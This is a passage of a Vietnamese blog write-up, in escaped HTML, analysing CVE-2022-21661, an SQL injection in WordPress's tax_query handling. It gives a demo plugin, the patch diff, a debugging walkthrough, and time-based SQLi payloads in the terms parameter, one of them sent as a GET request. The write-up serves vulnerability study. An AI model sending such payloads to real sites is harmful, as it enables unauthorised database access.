&lt;strong&gt;debug&lt;/strong&gt; và &lt;strong&gt;truy vết&lt;/strong&gt;, ta cần cài đặt thêm hai extension sau trong VS Code:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;PHP Extension Pack&lt;/strong&gt; =&amp;gt; tìm bằng từ khóa: &lt;code&gt;xdebug.php-pack&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;PHP Tools&lt;/strong&gt; for VS Code =&amp;gt; tìm bằng từ khóa: &lt;code&gt;devsense.phptools-vscode&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;custom-plugin&#34;&gt;&lt;span&gt;Custom Plugin&lt;/span&gt;&#xA;  &lt;a href=&#34;#custom-plugin&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Vì lỗ hổng SQLi này ảnh hưởng đến &lt;strong&gt;WordPress Core&lt;/strong&gt;, nhưng chỉ có thể khai thác gián tiếp thông qua &lt;strong&gt;plugin&lt;/strong&gt; hoặc &lt;strong&gt;theme&lt;/strong&gt; sử dụng &lt;code&gt;WP_Query&lt;/code&gt;, nên ta cần thông qua một &lt;strong&gt;plugin&lt;/strong&gt; hoặc &lt;strong&gt;theme&lt;/strong&gt; để tạo tương tác với &lt;strong&gt;WP_Query&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Ta xây dựng &lt;strong&gt;plugin&lt;/strong&gt; sử dụng &lt;code&gt;WP_Query&lt;/code&gt;, hiển thị query được thực thi thông qua &lt;code&gt;WP_Query::request&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;/**&#xA; * Plugin Name: Demo WP_Query&#xA; * Description: Plugin demo WP_Query&#xA; * Version: 1.0&#xA; * Author: w41bu1&#xA; */&#xA;&#xA;if (!defined(&amp;#39;ABSPATH&amp;#39;))&#xA;    exit;&#xA;&#xA;function da_show_posts()&#xA;{&#xA;    $args = [&#xA;        &amp;#39;post_type&amp;#39; =&amp;gt; &amp;#39;post&amp;#39;,&#xA;        &amp;#39;tax_query&amp;#39; =&amp;gt; [&#xA;            [&#xA;                &amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;category&amp;#39;,&#xA;                &amp;#39;field&amp;#39; =&amp;gt; &amp;#39;term_taxonomy_id&amp;#39;,&#xA;                &amp;#39;terms&amp;#39; =&amp;gt; [1,2,3],&#xA;                &amp;#39;operator&amp;#39; =&amp;gt; &amp;#39;IN&amp;#39;,&#xA;            ],&#xA;        ],&#xA;    ];&#xA;&#xA;    $query = new WP_Query($args);&#xA;&#xA;    ob_start();&#xA;&#xA;    echo &amp;#39;&amp;lt;h3&amp;gt;Demo WP_Query&amp;lt;/h3&amp;gt;&amp;#39;;&#xA;    echo &amp;#39;&amp;lt;pre style=&amp;#34;background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;&amp;#34;&amp;gt;&amp;#39;;&#xA;    echo &amp;#34;SQL query generated by WP_Query:\n\n&amp;#34;;&#xA;    echo esc_html($query-&amp;gt;request); // Display executed query &#xA;    echo &amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;;&#xA;&#xA;    if ($query-&amp;gt;have_posts()) {&#xA;        echo &amp;#39;&amp;lt;ul&amp;gt;&amp;#39;;&#xA;        while ($query-&amp;gt;have_posts()) {&#xA;            $query-&amp;gt;the_post();&#xA;            echo &amp;#39;&amp;lt;li&amp;gt;&amp;#39; . get_the_title() . &amp;#39; (&amp;#39; . get_the_ID() . &amp;#39;)&amp;lt;/li&amp;gt;&amp;#39;;&#xA;        }&#xA;        echo &amp;#39;&amp;lt;/ul&amp;gt;&amp;#39;;&#xA;    } else {&#xA;        echo &amp;#39;&amp;lt;p&amp;gt;No posts found.&amp;lt;/p&amp;gt;&amp;#39;;&#xA;    }&#xA;&#xA;    wp_reset_postdata();&#xA;    return ob_get_clean();&#xA;}&#xA;add_shortcode(&amp;#39;demo_wp_query&amp;#39;, &amp;#39;da_show_posts&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://developer.wordpress.org/reference/classes/wp_query/#taxonomy-parameters&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Taxonomy parameters&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tạo page mới với &lt;code&gt;&amp;lt;page-title&amp;gt;&lt;/code&gt; có &lt;strong&gt;shortcode&lt;/strong&gt; :&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[demo_wp_query]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Truy vấn sẽ được hiển thị khi truy cập &lt;code&gt;http://localhost/&amp;lt;page-title&amp;gt;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/demo_page.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Trang demo hiển thị kết quả WP_Query&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;wpdb&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Là lớp PHP cốt lõi của WordPress dùng để thao tác trực tiếp với MySQL.&lt;/li&gt;&#xA;&lt;li&gt;Cho phép lập trình viên &lt;strong&gt;viết và thực thi câu SQL thô&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;WP_Query&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Là một lớp trừu tượng hóa giúp lấy dữ liệu bài viết (post) từ database mà &lt;strong&gt;không cần viết SQL trực tiếp&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Lập trình viên chỉ cần truyền vào mảng tham số (args), WordPress sẽ tự động dựng câu SQL phù hợp.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Mối quan hệ&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;WP_Query không trực tiếp truy vấn MySQL.&lt;/li&gt;&#xA;&lt;li&gt;Thay vào đó, nó xây dựng câu SQL dựa trên args, áp dụng các bước &lt;strong&gt;kiểm tra&lt;/strong&gt;/&lt;strong&gt;validate&lt;/strong&gt;, rồi gọi &lt;code&gt;$wpdb&lt;/code&gt; để thực thi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;WordPress là một dự án &lt;strong&gt;mã nguồn mở&lt;/strong&gt; với kho lưu trữ được công khai trên &lt;strong&gt;GitHub&lt;/strong&gt;. Vì vậy, mọi bản vá đều được commit trực tiếp tại đây. Do đó, để phân tích một lỗ hổng, ta chỉ cần tìm đến commit liên quan và quan sát sự thay đổi trong mã nguồn.&lt;/p&gt;&#xA;&lt;p&gt;Trong phần reference của &lt;strong&gt;CVE-2022-21661&lt;/strong&gt;, có liên kết đến &lt;a href=&#34;https://github.com/WordPress/wordpress-develop/commit/17efac8c8ec64555eff5cf51a3eff81e06317214&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;commit&lt;/a&gt; trên GitHub:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/patch_diff.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;So sánh bản vá giữa hai phiên bản&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Lỗ hổng được vá trong file &lt;strong&gt;src/wp-includes/class-wp-tax-query.php&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$query[&amp;#39;terms&amp;#39;] = array_unique( (array) $query[&amp;#39;terms&amp;#39;] );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Ép &lt;code&gt;$query[&#39;terms&#39;]&lt;/code&gt; thành mảng và loại bỏ giá trị trùng lặp.&lt;/li&gt;&#xA;&lt;li&gt;Không có bước kiểm tra hoặc ép kiểu dữ liệu, dẫn đến nguy cơ chèn dữ liệu không hợp lệ vào truy vấn SQL.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ví dụ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args = [&#xA;    &amp;#39;post_type&amp;#39; =&amp;gt; &amp;#39;post&amp;#39;,&#xA;    &amp;#39;tax_query&amp;#39; =&amp;gt; [&#xA;        [&#xA;            &amp;#39;taxonomy&amp;#39; =&amp;gt; &amp;#39;category&amp;#39;,&#xA;            &amp;#39;field&amp;#39; =&amp;gt; &amp;#39;term_taxonomy_id&amp;#39;,&#xA;            &amp;#39;terms&amp;#39; =&amp;gt; [&amp;#39;1) AND (SELECT SLEEP(5)) # &amp;#39;],&#xA;            &amp;#39;operator&amp;#39; =&amp;gt; &amp;#39;IN&amp;#39;,&#xA;        ],&#xA;    ],&#xA;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( &amp;#39;slug&amp;#39; === $query[&amp;#39;field&amp;#39;] || &amp;#39;name&amp;#39; === $query[&amp;#39;field&amp;#39;] ) {&#xA;    $query[&amp;#39;terms&amp;#39;] = array_unique( (array) $query[&amp;#39;terms&amp;#39;] );&#xA;} else {&#xA;    $query[&amp;#39;terms&amp;#39;] = wp_parse_id_list( $query[&amp;#39;terms&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Bổ sung điều kiện dựa vào &lt;code&gt;$query[&#39;field&#39;]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu là &lt;strong&gt;slug&lt;/strong&gt; hoặc &lt;strong&gt;name&lt;/strong&gt; =&amp;gt; giữ nguyên cách xử lý cũ.&lt;/li&gt;&#xA;&lt;li&gt;Nếu là &lt;strong&gt;ID&lt;/strong&gt; =&amp;gt; dùng &lt;code&gt;wp_parse_id_list()&lt;/code&gt; để ép kiểu dữ liệu thành mảng số nguyên an toàn.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Ta biết đây là bước ép kiểu dữ liệu thành mảng số nguyên bởi vì trong &lt;code&gt;tax_query&lt;/code&gt;&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;, tham số &lt;code&gt;field&lt;/code&gt; chỉ nhận 4 giá trị: &lt;code&gt;slug&lt;/code&gt;, &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;term_taxonomy_id&lt;/code&gt; và &lt;code&gt;term_id&lt;/code&gt;. Trong đó, hai trường &lt;code&gt;term_taxonomy_id&lt;/code&gt; và &lt;code&gt;term_id&lt;/code&gt; thuộc bảng &lt;code&gt;wp_term_taxonomy&lt;/code&gt; và đều có kiểu dữ liệu &lt;strong&gt;BIGINT UNSIGNED&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; DESC wp_term_taxonomy;&#xA;&amp;#43;------------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| Field            | Type            | Null | Key | Default | Extra          |&#xA;&amp;#43;------------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;| term_taxonomy_id | bigint unsigned | NO   | PRI | NULL    | auto_increment |&#xA;| term_id          | bigint unsigned | NO   | MUL | 0       |                |&#xA;| taxonomy         | varchar(32)     | NO   | MUL |         |                |&#xA;| description      | longtext        | NO   |     | NULL    |                |&#xA;| parent           | bigint unsigned | NO   |     | 0       |                |&#xA;| count            | bigint          | NO   |     | 0       |                |&#xA;&amp;#43;------------------&amp;#43;-----------------&amp;#43;------&amp;#43;-----&amp;#43;---------&amp;#43;----------------&amp;#43;&#xA;6 rows in set (0.01 sec)&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-work&#34;&gt;&lt;span&gt;How it work?&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-work&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug1.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Breakpoint tại đầu hàm clean_query&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug2.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Tiếp tục đến query có taxonomy khớp&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug3.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Quan sát wp_list_pluck ghi đè terms&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug4.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Tránh ghi đè terms bằng return sớm&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/debug5.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Payload giữ nguyên trong truy vấn thực thi&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack1.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Đối tượng WP_Query được tạo&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack2.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Hàm __construct của WP_Query được gọi&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack3.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Gọi get_posts để thực thi query&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack4.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Điều kiện trong get_posts thỏa mãn, gọi get_sql&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack5.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;get_sql trả về get_sql_clauses&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack6.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;get_sql_clauses gọi get_sql_for_query&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack8.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Duyệt mảng query trong get_sql_for_query&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack15.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Kiểm tra keys terms, taxonomy, operator,...&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack7.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Gọi get_sql_for_clause&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack9.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Bypass clean_query giữ nguyên payload&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack10.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Payload gán vào $sql[&amp;#39;where&amp;#39;]&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack11.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Thêm () vào mệnh đề WHERE&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack16.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Thêm AND và trả về get_sql&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack14.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;get_posts nhận giá trị từ get_sql&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack12.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Payload thêm vào $clauses[&amp;#39;where&amp;#39;]&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/callstack13.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Quan sát last_query tại nơi thực thi SQL&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Chart minh họa luồng thực thi&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/chart.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Biểu đồ luồng thực thi của WP_Query dẫn đến SQLi&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Thay giá trị của &lt;code&gt;terms&lt;/code&gt; bằng payload SQLi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /demo/?terms=1)&amp;#43;AND&amp;#43;(SELECT&amp;#43;1&amp;#43;FROM&amp;#43;(SELECT&amp;#43;SLEEP(5))a)&amp;#43;%23&amp;#43; HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-01-cve-2022-21661/detect.png&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;h4&gt;Kết quả phản hồi cho thấy truy vấn chậm do payload hoạt động&lt;/h4&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 